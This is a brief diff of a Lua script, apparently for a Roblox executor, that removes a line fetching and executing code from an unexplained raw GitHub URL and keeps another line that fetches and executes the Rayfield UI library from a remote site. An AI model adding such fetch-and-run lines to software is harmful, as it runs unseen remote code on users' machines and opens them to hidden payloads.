@@ -15,8 +15,6 @@ local executorName = identifyexecutor()
 local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 print("Game Name: " .. gameName)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rolezeay/loading/refs/heads/main/hmmm"))()
-
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local openingSound = Instance.new("Sound")
